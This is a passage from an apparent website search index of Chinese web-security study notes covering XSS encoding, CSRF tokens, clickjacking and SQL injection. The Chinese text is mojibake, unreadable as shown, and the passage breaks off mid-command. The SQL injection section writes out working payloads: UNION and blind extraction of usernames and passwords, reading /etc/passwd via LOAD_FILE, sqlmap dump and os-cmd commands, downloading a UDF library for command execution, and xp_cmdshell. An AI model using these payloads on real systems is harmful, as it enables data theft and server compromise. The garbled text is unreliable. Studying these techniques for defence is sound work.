é˜²å¾¡ä¸Šï¼Œè¾“å…¥æ£€æŸ¥ä¸€èˆ¬æ˜¯æ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„æ•°æ®æ˜¯å¦åŒ…å«ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œæ¯”å¦‚ \u0026lt;ã€\u0026gt;ã€'ã€\u0026quot; ç­‰ã€‚å¦‚æœå‘ç°å­˜åœ¨ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ™å°†è¿™äº›å­—ç¬¦è¿‡æ»¤æˆ–è€…ç¼–ç ã€‚\nè¿™ç§è¾“å…¥æ£€æŸ¥æ–¹å¼è¢«ç§°ä¸º â€XSS Filterâ€œã€‚äº’è”ç½‘ä¸Šæœ‰å¾ˆå¤šå¼€æºçš„ â€XSS Filterâ€œ çš„å®ç°ã€‚\nXSS Filter åœ¨ç”¨æˆ·æäº¤æ•°æ®æ—¶è·å–å˜é‡ï¼Œå¹¶è¿›è¡Œ XSS æ£€æŸ¥ï¼Œä½†æ­¤æ—¶æ•°æ®å¹¶æ²¡æœ‰ç»“åˆæ¸²æŸ“é¡µé¢çš„ HTML ä»£ç ï¼Œå› æ­¤ XSS Filter å¯¹è¯­å¢ƒçš„ç†è§£å¹¶ä¸å®Œæ•´ã€‚å¯èƒ½ä¼šæ”¹å˜ç”¨æˆ·çš„æ•°æ®çš„è¯­ä¹‰ã€‚\nè¾“å‡ºæ£€æŸ¥ #  ä¸€èˆ¬æ¥è¯´ï¼Œå¯Œæ–‡æœ¬ï¼ˆRich Text Format, RTFï¼‰çš„è¾“å‡ºå¤–ï¼Œåœ¨å˜é‡è¾“å‡ºåˆ° HTML é¡µé¢æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç¼–ç æˆ–è½¬ä¹‰çš„æ–¹å¼æ¥é˜²å¾¡ XSS æ”»å‡»ã€‚\nç¼–ç åˆ†ä¸ºå¾ˆå¤šç§ï¼Œé’ˆå¯¹ HTML ä»£ç çš„ç¼–ç æ–¹å¼æ—¶ HtmlEncodeï¼šè¿™å¹¶éä¸€ä¸ªä¸“ç”¨åè¯ï¼Œå®ƒåªæ˜¯ä¸€ç§å‡½æ•°å®ç°ï¼Œå®ƒå¯¹åº”çš„æ ‡å‡†æ—¶ ISO-8859-1ã€‚\nä¸ºäº†å¯¹æŠ— XSSï¼Œåœ¨ç¼–ç ä¸­è‡³å°‘è¦æ±‚ä»¥ä¸‹çš„å­—ç¬¦è¢«è½¬æ¢ï¼š\n   \u0026amp; \u0026lt; \u0026gt; \u0026quot; ' /     \u0026amp;amp; \u0026amp;lt; \u0026amp;gt; \u0026amp;quot; \u0026amp;#x27; \u0026amp;#x2F;    åœ¨ OWASP ESAPI ä¸­æœ‰ä¸€ä¸ªå®‰å…¨çš„ JavaScriptEncode çš„å®ç°ï¼Œéå¸¸ä¸¥æ ¼ã€‚ä½¿ç”¨ä¸¾ä¾‹ï¼š\nString safe = ESAPI.encoder().encodeForHTMLAttribute( request.getParameter(\u0026#34;input\u0026#34;) ); // é™¤äº†å­—æ¯ï¼Œæ•°å­—å¤–çš„æ‰€æœ‰ç‰¹æ®Šå­—ç¬¦éƒ½è¢«ç¼–ç æˆ HTMLEntities. å¯¹äºä¸åŒçš„è¾“å‡ºç±»å‹ï¼Œä¸‹é¢åˆ—ä¸¾äº†å¤šä¸ªé˜²å¾¡ XSS çš„æ€»ç»“ã€‚ä¸‹é¢ç”¨ $var è¡¨ç¤ºç”¨æˆ·æ•°æ®ï¼Œå®ƒå°†è¢«å¡«å…¥ HTML ä»£ç ä¸­ã€‚å¯èƒ½å­˜åœ¨ä»¥ä¸‹çš„åœºæ™¯ï¼š\n  åœ¨ HTML æ ‡ç­¾ä¸­è¾“å‡ºï¼š\n\u0026lt;a href=#\u0026gt;$var\u0026lt;/a\u0026gt; åœ¨è¿™ç§åœºæ™¯ä¸‹ï¼ŒXSS çš„åˆ©ç”¨æ–¹å¼ä¸€èˆ¬æ˜¯æ„é€ ä¸€ä¸ª \u0026lt;script\u0026gt; æ ‡ç­¾ã€‚é˜²å¾¡æ–¹æ³•æ˜¯æ˜¯å¯¹å˜é‡ä½¿ç”¨ HtmlEncodeã€‚\n  åœ¨ HTML å±æ€§ä¸­è¾“å‡ºï¼š\n\u0026lt;div id=\u0026#34;abc\u0026#34; name=\u0026#34;$var\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; é˜²å¾¡æ–¹å¼ä¹Ÿæ˜¯ HtmlEncodeã€‚å› ä¸ºè¿™ç§æ–¹å¼å˜é‡æ˜¯ç”¨æˆ·ä¸å¯è§çš„ï¼Œå› æ­¤å¯ä»¥é‡‡ç”¨ OWASP ESAPI ä¸­çš„ä¸¥æ ¼ç¼–ç æ–¹å¼ï¼Œå°†æ‰€æœ‰ç‰¹æ®Šå­—ç¬¦éƒ½è¿›è¡Œç¼–ç ã€‚\n  åœ¨ \u0026lt;script\u0026gt; æ ‡ç­¾ä¸­è¾“å‡ºï¼Œåº”å½“é¦–å…ˆä¿è¯è¾“å‡ºçš„å˜é‡åœ¨å¼•å·ä¸­ï¼š\n\u0026lt;script\u0026gt;\rvar x = \u0026#34;$var\u0026#34;;\r\u0026lt;/script\u0026gt; å› æ­¤æ”»å‡»è€…éœ€è¦é—­åˆå¼•å·æ‰èƒ½å®æ–½æ”»å‡»ï¼Œé˜²å¾¡æ—¶ä½¿ç”¨ JavascriptEncodeã€‚\n  åœ¨äº‹ä»¶ä¸­è¾“å‡ºï¼š\n\u0026lt;a href=# onclick=\u0026#34;funcA(\u0026#39;$var\u0026#39;)\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt; è¿™ä¸ªè¾“å‡ºåŸŸåœ¨ \u0026lt;script\u0026gt; æ ‡ç­¾ä¸­çš„è¾“å‡ºç±»ä¼¼ã€‚åœ¨é˜²å¾¡æ—¶ä½¿ç”¨ JavascriptEncodeã€‚\n  åœ¨ css ä¸­è¾“å‡ºï¼Œæ”»å‡»æ–¹å¼è§ åˆ©ç”¨ CSS æ„é€ ã€‚\nå¯è§åˆ©ç”¨ css çš„æ”»å‡»å¯è°“æ˜¯ç›¸å½“ä¸°å¯Œã€‚å› æ­¤æˆ‘ä»¬åº”å½“å°½å¯èƒ½ç¦æ­¢ç”¨æˆ·å¯æ§åˆ¶çš„å˜é‡åœ¨ \u0026lt;style\u0026gt; æ ‡ç­¾ã€html æ ‡ç­¾çš„ style å±æ€§ã€ä»¥åŠ css æ–‡ä»¶ä¸­è¾“å‡ºã€‚å¦‚æœä¸€å®šæœ‰è¿™æ ·çš„éœ€æ±‚ï¼Œå»ºè®®ä½¿ç”¨ OWASP ESAPI ä¸­çš„å‡½æ•° encodeForCSS()ï¼š\nString safe = ESAPI.encoder().encodeForCSS( request.getParameter(\u0026#34;input\u0026#34;) ); å®ƒä¼šæŠŠé™¤äº†å­—æ¯ã€æ•°å­—å¤–çš„æ‰€æœ‰å­—ç¬¦éƒ½ç¼–ç æˆåå…­è¿›åˆ¶çš„å½¢å¼ \\uHHã€‚\n  åœ¨åœ°å€ä¸­è¾“å‡ºï¼š\n\u0026lt;a href=\u0026#34;http://hacker.org/?test=$var\u0026#34;\u0026gt;test\u0026lt;/a\u0026gt;s ä¸€èˆ¬æ¥è¯´ä½¿ç”¨å‡½æ•° URLEncode å³å¯ï¼Œå®ƒä¼šå°†å­—ç¬¦è½¬åŒ–ä¸º %HH çš„å½¢å¼ã€‚\nä½†æ˜¯è¿˜æœ‰ä¸€ç§æƒ…å†µï¼Œå°±æ˜¯æ•´ä¸ª URL éƒ½èƒ½å¤Ÿè¢«ç”¨æˆ·æ§åˆ¶ï¼Œè¿™æ—¶ URL çš„ Protocal éƒ¨é—¨ä¸ Host éƒ¨åˆ†æ˜¯ä¸èƒ½å¤Ÿä½¿ç”¨ URLEncode çš„ï¼Œå¦åˆ™ä¼šæ”¹å˜ URL çš„å«ä¹‰ã€‚\næ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡æ„é€  javascriptã€vbscriptã€dataURI ç­‰ä¼ªåè®®å¯¼è‡´è„šæœ¬æ”»å‡»ï¼š\n\u0026lt;a href=\u0026#34;javascript:alert(1)\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; dataURI ä¼ªåè®®æ˜¯ Mozilla æµè§ˆå™¨æ”¯æŒçš„ï¼Œèƒ½å¤Ÿå†™ä¸€æ®µä»£ç åœ¨ URL ä¸­ï¼š\n\u0026lt;a href=\u0026#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\u0026#34;\u0026gt;   "},{"id":342,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/3.%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0csrf/","title":"3.è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€  Csrf","section":"1.å®¢æˆ·ç«¯å®‰å…¨","content":"è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€  CSRF #   CSRF: Cross Site Request Forgery\n CSRF çš„é˜²å¾¡ #  éªŒè¯ç  #  CSRF æ”»å‡»çš„è¿‡ç¨‹ï¼Œå¾€å¾€æ˜¯åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ„é€ äº†ç½‘ç»œè¯·æ±‚ã€‚å› æ­¤åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼ŒéªŒè¯ç èƒ½å¤Ÿå¾ˆå¥½åœ°éåˆ¶ CSRF æ”»å‡»ã€‚\nä½†æ˜¯éªŒè¯ç å¹¶éä¸‡èƒ½ã€‚å¾ˆå¤šæ—¶å€™ï¼Œå¤„äºç”¨æˆ·ä½“éªŒè€ƒè™‘ï¼Œç½‘ç«™å¹¶ä¸èƒ½ç»™æ‰€æœ‰çš„æ“ä½œéƒ½åŠ ä¸ŠéªŒè¯ç ã€‚\nRefer Check #  Refer Check åœ¨äº’è”ç½‘ä¸­æœ€å¸¸è§çš„åº”ç”¨å°±æ˜¯é˜²æ­¢å›¾ç‰‡ç›—é“¾ï¼š\n ç›—é“¾ï¼šæœåŠ¡å•†è‡ªå·±ä¸æä¾›æœåŠ¡çš„å†…å®¹ï¼Œé€šè¿‡æŠ€æœ¯æ‰‹æ®µç»•è¿‡å…¶å®ƒæœ‰åˆ©ç›Šçš„æœ€ç»ˆç”¨æˆ·ç•Œé¢ï¼ˆå¦‚å¹¿å‘Šï¼‰ï¼Œç›´æ¥åœ¨è‡ªå·±çš„ç½‘ç«™ä¸Šå‘æœ€ç»ˆç”¨æˆ·æä¾›å…¶å®ƒæœåŠ¡æä¾›å•†çš„æœåŠ¡å†…å®¹ï¼Œéª—å–æœ€ç»ˆç”¨æˆ·çš„æµè§ˆå’Œç‚¹å‡»ç‡ã€‚  é€šè¿‡åŒæ ·çš„åŸç†ï¼ŒRefer Check ä¹Ÿå¯ä»¥ç”¨äºæ£€æŸ¥è¯·æ±‚æ˜¯å¦æ¥è‡ªåˆæ³•çš„ â€œæºâ€ã€‚\nå³ä½¿æˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡æ£€æŸ¥ Refer æ˜¯å¦åˆæ³•æ¥åˆ¤æ–­ç”¨æˆ·æ˜¯å¦è¢« CSRF æ”»å‡»ï¼Œä¹Ÿä»…ä»…æ˜¯æ»¡è¶³äº†é˜²å¾¡çš„å……åˆ†éå¿…è¦æ¡ä»¶ã€‚Refer Check çš„ç¼ºé™·åœ¨äºï¼ŒæœåŠ¡å™¨å¹¶éä»»ä½•æ—¶å€™éƒ½èƒ½å–åˆ° Referã€‚å¾ˆå¤šæ—¶å€™å¤„äºéšç§è€ƒè™‘ã€æˆ–è€…æ˜¯æµè§ˆå™¨é™åˆ¶äº† Refer çš„å‘é€ã€‚\nå› æ­¤æˆ‘ä»¬æ— æ³•ä¾èµ– Refer Check ä½œä¸ºé˜²å¾¡ CSRF çš„ä¸»è¦æ‰‹æ®µã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç”¨å®ƒç›‘æ§ CSRF æ”»å‡»çš„å‘ç”Ÿã€‚\nAnti CSRF Token #  CSRF ä¸ºä»€ä¹ˆå¯ä»¥æ”»å‡»æˆåŠŸå‘¢ï¼Ÿ\n å…¶æœ¬è´¨åŸå› æ˜¯ï¼Œé‡è¦æ“ä½œçš„æ‰€æœ‰å‚æ•°éƒ½æ˜¯å¯ä»¥è¢«æ”»å‡»è€…çŒœæµ‹çš„ã€‚æ”»å‡»è€…åªæœ‰é¢„æµ‹é™¤äº† URL çš„æ‰€æœ‰å‚æ•°ä¸å‚æ•°å€¼ï¼Œæ‰èƒ½æˆåŠŸåœ°æ„é€ ä¸€ä¸ªä¼ªé€ çš„è¯·æ±‚ã€‚ å¤„äºè¿™ä¸ªåŸå› æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€äº›éšæœºæ•°æŠŠå‚æ•°åŠ å¯†ï¼Œä½¿æ”»å‡»è€…æ— æ³•çŒœæµ‹åˆ°å‚æ•°å€¼ã€‚  è¿™ç§æ–¹å¼å°±å«åš Anti CSRF Tokenã€‚\nå› ä¸º Token çš„å­˜åœ¨ï¼ŒæœåŠ¡å™¨åªéœ€è¦éªŒè¯è¡¨å•ä¸­çš„ Token ä¸ç”¨æˆ·çš„ Sessionï¼ˆæˆ– Cookieï¼‰ä¸­çš„ Token æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸€è‡´åˆ™è®¤ä¸ºæ˜¯åˆæ³•è¯·æ±‚ï¼›å¦åˆ™éæ³•ã€‚\nä½¿ç”¨ Anti CSRF Token çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼š\n Token çš„ç”Ÿæˆä¸€å®šè¦è¶³å¤Ÿéšæœºï¼Œéœ€è¦ä½¿ç”¨å®‰å…¨çš„éšæœºæ•°ç”Ÿæˆå™¨ç”Ÿæˆ Tokenï¼› Token çš„ç›®çš„ä¸æ˜¯ä¸ºäº†é˜²æ­¢é‡å¤æäº¤ã€‚ä¸ºäº†ä½¿ç”¨æ–¹ä¾¿ï¼Œå¯ä»¥å…è®¸åœ¨ä¸€ä¸ªç”¨æˆ·çš„æœ‰æ•ˆç”Ÿå‘½å‘¨æœŸå†…ï¼Œéƒ½ä½¿ç”¨åŒä¸€ä¸ª Tokenã€‚å¦‚æœç”¨æˆ·å·²ç»æäº¤äº†è¡¨å•ï¼Œåº”å½“é‡æ–°ç”Ÿæˆä¸€ä¸ªï¼› å¦‚æœç”¨æˆ·æ‰“å¼€å¤šä¸ªçª—å£ï¼Œåº”å½“è€ƒè™‘ç”Ÿæˆå¤šä¸ªæœ‰æ•ˆ Tokenï¼Œè§£å†³å¤šé¡µé¢å…±å­˜é—®é¢˜ï¼› æ³¨æ„ Token çš„ä¿å¯†æ€§ã€‚ä¸åº”è¯¥å‘é€ GET è¯·æ±‚ï¼Œå¯¼è‡´å‡ºç°åœ¨æŸä¸ªé¡µé¢çš„ URL ä¸­ï¼›  CSRF çš„ Token ä»…ä»…ç”¨äºå¯¹æŠ— CSRF æ”»å‡»ï¼Œå½“ç½‘ç«™è¿˜å­˜åœ¨ XSS æ¼æ´æ—¶ï¼Œè¿™ä¸ªæ–¹æ¡ˆå°±ä¼šå˜å¾—æ— æ•ˆã€‚åœ¨ XSS æ”»å‡»ä¸‹ï¼Œæ”»å‡»è€…å®Œå…¨å¯ä»¥è¯·æ±‚é¡µé¢åï¼Œè¯»å‡ºé¡µé¢å†…å®¹é‡Œçš„ Token å€¼ï¼Œå†æ„é€ ä¸€ä¸ªåˆæ³•çš„è¯·æ±‚ï¼Œè¿™ä¸ªè¿‡ç¨‹å¯ä»¥ç§°ä¹‹ä¸º XSRFï¼Œå’Œ CSRF ä»¥ç¤ºåŒºåˆ†ã€‚\n"},{"id":343,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/4.%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81clickjacking/","title":"4.ç‚¹å‡»åŠ«æŒ Click Jacking","section":"1.å®¢æˆ·ç«¯å®‰å…¨","content":"ç‚¹å‡»åŠ«æŒ Click Jacking #  é˜²å¾¡ Click Jacking #  frame busting #  é€šå¸¸å¯ä»¥å†™ä¸€æ®µ JavaScript ä»£ç ï¼Œä»¥ç¦æ­¢ iframe çš„åµŒå¥—ã€‚è¿™ç§æ–¹æ³•å«åš frame bustingã€‚æ¯”å¦‚ï¼š\nif (top.location != location) top.location = self.location ä½†æ˜¯è¿™ç§æ–¹æ³•ä¹Ÿå­˜åœ¨ä¸€äº›ç¼ºé™·ï¼Œå› ä¸ºå®ƒæ˜¯ç”¨ JavaScript å†™çš„ï¼Œæ§åˆ¶èƒ½åŠ›å¹¶ä¸æ˜¯ç‰¹åˆ«å¼ºï¼Œå› æ­¤æœ‰è®¸å¤šæ–¹æ³•å¯ä»¥ç»•è¿‡å®ƒã€‚æ¯”å¦‚ä¸Šé¢çš„æ–¹æ³•å°±å¯ä»¥ç”¨åµŒå¥—å¤šä¸ª iframe çš„æ–¹æ³•ç»•è¿‡ï¼š\nAttacker top frame: # è‡ªå­¦ç¬”è®° (pdf)  \u0026lt;iframe src=\u0026#34;attacker2.html\u0026#34;\u0026gt;  Attacker sub-frame:  \u0026lt;iframe src=\u0026#34;http://victim.com\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/iframe\u0026gt; X-Frame-Options #  å› ä¸º frame busting å­˜åœ¨è¢«ç»•è¿‡çš„å¯èƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ›´å¥½çš„æ–¹æ³•ã€‚ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ¡ˆæ˜¯ä½¿ç”¨ä¸€ä¸ª HTTP è¯·æ±‚å¤´â€”â€”X-Frame-Optionsï¼Œè¿™ä¸ªè¯·æ±‚å¤´å¯ä»¥è¯´æ˜¯ä¸ºäº†è§£å†³ Click Jacking è€Œç”Ÿçš„ã€‚\n  å½“è¿™ä¸ªå€¼ä¸º DENY æ—¶ï¼Œæµè§ˆå™¨ä¼šæ‹’ç»å½“å‰é¡µé¢åŠ è½½ä»»ä½• frame é¡µé¢ï¼›\n  è‹¥å€¼ä¸º SAMEORIGIN æ—¶ï¼Œåˆ™å¯ä»¥å®šä¹‰å…è®¸ frame åŠ è½½çš„é¡µé¢åœ°å€ã€‚\n  "},{"id":344,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/5.html5%E5%AE%89%E5%85%A8/","title":"5. Html5å®‰å…¨","section":"1.å®¢æˆ·ç«¯å®‰å…¨","content":"HTML5 å®‰å…¨ #   ä½˜å´§æ—è®¤ä¸ºè¿™å·²ç»æ˜¯ä¸€ä¸ªè¿‡æ—¶çš„æ¦‚å¿µäº†ã€‚\n "},{"id":345,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/2.%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E5%85%A8/1.%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/","title":"1.æ³¨å…¥æ”»å‡»","section":"2.æœåŠ¡ç«¯å®‰å…¨","content":"æ³¨å…¥æ”»å‡» #   Akamai åœ¨ 2019 å¹´ç ”ç©¶è¡¨æ˜ 65.1% çš„ Web åº”ç”¨ç¨‹åºæ”»å‡»æ¥è‡ª SQL æ³¨å…¥\n SQL æ³¨å…¥çš„ä¸¤ç§åˆ†ç±»ï¼š\n  ç›²æ³¨ï¼šåœ¨æœåŠ¡å™¨æ²¡æœ‰é”™è¯¯å›æ˜¾æ—¶å®Œæˆçš„æ³¨å…¥æ”»å‡»ã€‚\n  Timing Attackï¼šåˆ©ç”¨ MySQL çš„ BENCHMARK() å‡½æ•°ã€‚\n  æ•°æ®åº“æ”»å‡»æŠ€å·§ #  å¸¸è§æ”»å‡»æŠ€å·§ #  æˆ‘ä»¬å‡è®¾åå°çš„æœåŠ¡å­˜åœ¨è¿™æ ·ä¸€ä¸ªæ²¡æœ‰æ ¡éªŒçš„è¯­å¥ï¼š\n$id = $_GET[\u0026#34;id\u0026#34;]; $sql = \u0026#34;select title,description,body from items where id=\u0026#34;.$id; SQL æ³¨å…¥æ—¶åŸºäºæ•°æ®åº“çš„ä¸€ç§æ”»å‡»ã€‚ä¸åŒçš„æ•°æ®åº“æœ‰ç€ä¸åŒçš„åŠŸèƒ½ã€ä¸åŒçš„è¯­æ³•å’Œå‡½æ•°ï¼š\n  SQL æ³¨å…¥å¯ä»¥çŒœè§£å‡ºæ•°æ®åº“çš„å¯¹åº”ç‰ˆæœ¬ï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ®µ Payloadï¼Œå¦‚æœ MySQL çš„ç‰ˆæœ¬æ˜¯ 4ï¼Œåˆ™ä¼šè¿”å› TRUEï¼š\nhttp://victim.com/index.php?id=5 and substring(@@version, 1, 1)=4   æµ‹è¯•è¡¨å admin æ˜¯å¦å­˜åœ¨ï¼Œåˆ—å passwd æ˜¯å¦å­˜åœ¨ï¼š\nhttp://victim.com/index.php?id=5 union all select 1,2,3 from admin  http://victim.com/index.php?id=5 union all select 1,2,passwd from admin   æƒ³è¦è¿›ä¸€æ­¥çŒœè§£é™¤ username å’Œ password å…·ä½“çš„å€¼ï¼Œå¯ä»¥é€šè¿‡åˆ¤æ–­å­—ç¬¦çš„èŒƒå›´è¯»å‡ºæ¥ï¼š\nhttp://victim.com/index.php?id=5 and ascii(substring((select concat(username, 0x3a, passwd) from users limit 0,1),1,1))\u0026gt;64 .... å¯è§åˆ©ç”¨ä¸€ä¸ª sql æ³¨å…¥çš„è¿‡ç¨‹éå¸¸ç¹çï¼Œæ‰€ä»¥éå¸¸æœ‰å¿…è¦ä½¿ç”¨ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„å·¥å…·æ¥å¸®åŠ©å®Œæˆæ•´ä¸ªè¿‡ç¨‹ï¼Œsqlmap å°±æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„è‡ªåŠ¨æ³¨å…¥å·¥å…·ï¼š\npython sqlmap.py -u \u0026#34;http://victim.com.index.php?id=5\u0026#34; --dump -T users   åœ¨ MySQL ä¸­ï¼Œå¯ä»¥é€šè¿‡ LOAD_FILE() è¯»å–æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶ä¸”é€šè¿‡ INTO DUMPFILE å†™å…¥æœ¬åœ°æ–‡ä»¶ã€‚å¦å¤–ï¼Œå¦‚æœè¦å°†æ–‡ä»¶è¯»å‡ºåï¼Œå†æŠŠç»“æœè¿”è¿˜ç»™æ”»å‡»è€…ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æŠ€å·§ï¼š\ncreate table potatoes(line BLOB); select 1,1,hex(LOAD_FILE(\u0026#39;/etc/passwd\u0026#39;)),1,1 into DUMPFILE \u0026#39;/tmp/potatoes\u0026#39;; LOAD DATA INFILE \u0026#39;/tmp/potatoes\u0026#39; into table potatos;   ä¸Šé¢å†™å…¥æ–‡ä»¶çš„æŠ€å·§ï¼Œç»å¸¸è¢«ç”¨äºå¯¼å‡ºä¸€ä¸ª webshellï¼Œä¸ºæ”»å‡»è€…çš„è¿›ä¸€æ­¥æ”»å‡»åšé“ºå«ã€‚\nå› æ­¤å†è®¾è®¡æ•°æ®åº“å®‰å…¨æ–¹æ¡ˆæ—¶ï¼Œå¯ä»¥ç¦æ­¢æ•°æ®åº“ç”¨æˆ·å…·å¤‡æ“ä½œæ–‡ä»¶çš„æƒé™ã€‚\nå‘½ä»¤æ‰§è¡Œ #  é™¤äº†å¯ä»¥é€šè¿‡å¯¼å‡º webshell é—´æ¥åœ°æ‰§è¡Œå‘½ä»¤å¤–ï¼Œè¿˜å¯ä»¥åˆ©ç”¨ â€œç”¨æˆ·è‡ªå®šä¹‰å‡½æ•° UDFâ€ çš„æŠ€å·§æ¥æ‰§è¡Œå‘½ä»¤ã€‚å¤§å¤šæ•°æ•°æ®åº“ä¸€èˆ¬éƒ½æ”¯æŒä»æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯¼å…¥ä¸€ä¸ªé“¾æ¥åº“æ–‡ä»¶ä½œä¸ºè‡ªå®šä¹‰å‡½æ•°ã€‚\né€šè¿‡ä»¥ä¸‹çš„è¯­æ³•å°±å¯ä»¥ç®€å† UDFï¼š\ncreate function f_name returns integer soname shared_library; å®‰å…¨ç ”ç©¶è€…ä»¬å‘ç°é€šè¿‡ lib_mysqludf_sys ä¸­æä¾›çš„å‡ ä¸ªå‡½æ•°ï¼ˆä¸»è¦æ˜¯ sys_eval ä¸ sys_exec()ï¼‰å°±å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚åœ¨æ”»å‡»è¿‡ç¨‹ä¸­ï¼Œå°† lib_mysqludf_sys.so ä¸Šä¼ åˆ°æ•°æ®åº“èƒ½è®¿é—®çš„è·¯å¾„ä¸‹ï¼Œå¹¶ä¸”åˆ›å»ºäº† UDF ä¹‹åå°±å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ã€‚è¿™ä¸ªé“¾æ¥åº“ä¸»è¦æœ‰ä»¥ä¸‹å››ä¸ªå‡½æ•°ï¼š\n sys_eval()ï¼šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå¹¶ä¸”å°†è¾“å‡ºè¿”å›ï¼› sys_exec()ï¼šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å¹¶ä¸”å°†é€€å‡ºç è¿”å›ï¼› sys_getã€sys_set()ï¼šè·å–ã€ä¿®æ”¹ï¼ˆåˆ›å»ºï¼‰ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼›  å…±äº«é“¾æ¥åº“å¯ä»¥é€šè¿‡å¼€æºä¿¡æ¯è·å¾—ï¼š\nwget --no-check-certificate https://github.com/mysqludf/lib_mysqludf_sys/raw/master/lib_mysqludf_sys.so sqlmap ä¸­ä¹Ÿé›†æˆäº†è¿™ä¸ªåŠŸèƒ½ï¼š\npython sqlmap.py -u \u0026#34;http://victim.com.index.php?id=5\u0026#34; --os-cmd id -v 1 UDF ä¸ä»…ä»…æ˜¯ MySQL çš„ç‰¹æ€§ï¼Œå…¶ä»–æ•°æ®åº“ä¹Ÿæœ‰ç€ç±»ä¼¼çš„åŠŸèƒ½ã€‚åˆ©ç”¨ UDF çš„åŠŸèƒ½å®æ–½æ”»å‡»çš„æŠ€å·§ä¹Ÿå¤§åŒå°å¼‚ã€‚æ¯”å¦‚ï¼š\n åœ¨ MS SQL-Server ä¸­ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹ xp_cmdshell æ‰§è¡Œå‘½ä»¤ï¼› åœ¨ Oracle æ•°æ®åº“ä¸­ï¼Œå¦‚æœæœåŠ¡å™¨åŒæ—¶è¿˜æœ‰ Java ç¯å¢ƒï¼Œé‚£ä¹ˆä¹Ÿå¯èƒ½é€ æˆå‘½ä»¤æ‰§è¡Œã€‚  ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨æ•°æ®åº“ä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè¦æ±‚å…·æœ‰è¾ƒé«˜çš„æƒé™ã€‚\næ”»å‡»å­˜å‚¨è¿‡ç¨‹ #  å­˜å‚¨è¿‡ç¨‹ä¸ºæ•°æ®åº“æä¾›äº†å¼ºå¤§çš„åŠŸèƒ½ï¼Œå®ƒä¸ UDF å¾ˆåƒï¼Œä½†å®ƒå¿…é¡»ä½¿ç”¨ CALL æˆ–è€… EXECUTE æ¥æ‰§è¡Œã€‚åœ¨æ³¨å…¥æ”»å‡»çš„è¿‡ç¨‹ä¸­ï¼Œå­˜å‚¨è¿‡ç¨‹å°†ä¸ºæ”»å‡»è€…æä¾›å¾ˆå¤§çš„ä¾¿åˆ©ã€‚\nåœ¨å¾®è½¯ SQL-Server ä¸­ xp_cmdshell å¯è°“æ˜¯è‡­åæ˜­è‘—äº†ï¼Œå®ƒåœ¨ 2000 ç‰ˆæœ¬ä¸­æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œä½†åœ¨ 2005 ä»¥åŠä»¥åçš„ç‰ˆæœ¬ä¸­åˆ™è¢«é»˜è®¤ç¦æ­¢äº†ï¼š\nEXEC master.dbo.xp_cmdshell \u0026#39;cmd.exe dir C:\u0026#39; ä½†æ˜¯å¦‚æœå½“å‰æ•°æ®åº“ç”¨æˆ·æ‹¥æœ‰ sysadmin æƒé™ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ sp_configure ï¼ˆ2005 ä¸ 2008 ç‰ˆæœ¬ï¼‰æˆ– sp_addextendedprocï¼ˆ2000 ç‰ˆæœ¬ï¼‰é‡æ–°å¼€å¯å®ƒï¼š\nEXEC sp_configure 